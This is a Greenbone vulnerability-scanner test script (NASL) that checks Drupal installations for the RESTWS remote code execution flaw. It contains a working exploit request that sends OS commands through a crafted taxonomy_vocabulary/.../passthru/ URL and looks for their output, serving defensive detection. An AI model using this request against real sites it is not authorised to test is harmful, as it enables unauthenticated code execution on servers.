CPE = "cpe:/a:drupal:drupal";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105817" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "Drupal RESTWS Remote Code Execution" );
	script_tag( name: "vuldetect", value: "Try to ececute the `id` command." );
	script_tag( name: "insight", value: "The RESTWS module enables to expose Drupal entities as RESTful web services.
  RESTWS alters the default page callbacks for entities to provide additional functionality. A vulnerability in
  this approach allows an attacker to send specially crafted requests resulting in arbitrary PHP execution.
  There are no mitigating factors. This vulnerability can be exploited by anonymous users." );
	script_tag( name: "summary", value: "The remote Drupal installation is prone to a remote code execution vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Install the latest version listed in the referenced advisory." );
	script_xref( name: "URL", value: "https://www.drupal.org/node/2765567" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-07-20 12:15:23 +0200 (Wed, 20 Jul 2016)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_dependencies( "drupal_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "drupal/installed" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
vtstrings = get_vt_strings();
cmds = exploit_commands();
for cmd in keys( cmds ) {
	url = dir + "/index.php?q=taxonomy_vocabulary/" + vtstrings["lowercase"] + "/passthru/" + cmds[cmd];
	if(buf = http_vuln_check( port: port, url: url, pattern: cmd )){
		report = http_report_vuln_url( port: port, url: url );
		report += "\n\nOutput:\n\n" + buf;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

